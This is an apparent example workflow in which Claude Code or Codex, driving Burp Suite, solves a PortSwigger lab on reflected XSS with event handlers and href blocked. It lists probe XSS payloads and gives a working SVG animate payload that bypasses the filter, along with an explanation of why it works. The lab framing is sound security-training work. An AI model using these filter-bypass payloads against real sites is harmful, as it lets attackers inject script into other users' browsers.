# Example: Reflected XSS with Event Handlers and href Attributes Blocked

## PortSwigger Lab Solved with Claude Code or Codex + Burp Suite

This is an example workflow for either supported client:

- Claude uses `burpsuite` plus `chrome-devtools`
- Codex uses `burp` plus `burp-browser`

## Context

- Lab: Reflected XSS with event handlers and `href` attributes blocked
- Objective: Execute `alert(1)` on an authorized PortSwigger lab target

## Workflow

### 1. Initial reconnaissance

Claude prompt:

```text
Inspect this authorized PortSwigger lab and identify where user input is reflected.
```

Codex prompt:

```text
Use $openburp-codex to inspect this authorized PortSwigger lab and identify where user input is reflected.
```

Expected behavior:

- open the lab through the browser MCP that is routed via Burp
- identify the reflected parameter
- keep raw request testing inside Burp

### 2. WAF enumeration with Burp

Use Burp MCP to send a few controlled payloads and map the filter behavior:

| Payload | Expected signal |
|---------|-----------------|
| `<img src=x onerror=alert(1)>` | Tag blocked |
| `<body onload=alert(1)>` | Tag blocked |
| `<svg onload=alert(1)>` | Event blocked |
| `<a href="javascript:alert(1)">` | Attribute blocked |
| `<svg>` | Allowed |

### 3. Exploit development

Once the filter behavior is clear, craft an SVG payload that sets `href` dynamically:

```html
<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click</text></a></svg>
```

Why it works:

- `<svg>`, `<a>`, `<animate>`, and `<text>` are allowed
- The WAF blocks direct `href`, but not dynamic assignment through `attributeName=href`
- The payload stays within the observed allowlist

### 4. Verification

Use the Burp-routed browser to confirm the payload behavior and capture evidence, while Burp records the traffic for replay or reporting.

## Example prompts

Claude:

```text
Solve this authorized PortSwigger XSS lab. Use Burp for payload testing and Chrome DevTools for verification. Keep the scope minimal and explain each request.
```

Codex:

```text
Use $openburp-codex to solve this authorized PortSwigger XSS lab. Use Burp for payload testing and the Burp-proxied browser for verification. Keep the scope minimal and explain each request.
```

## Safety

Use this pattern only on labs, staging environments, or targets you are explicitly authorized to test.
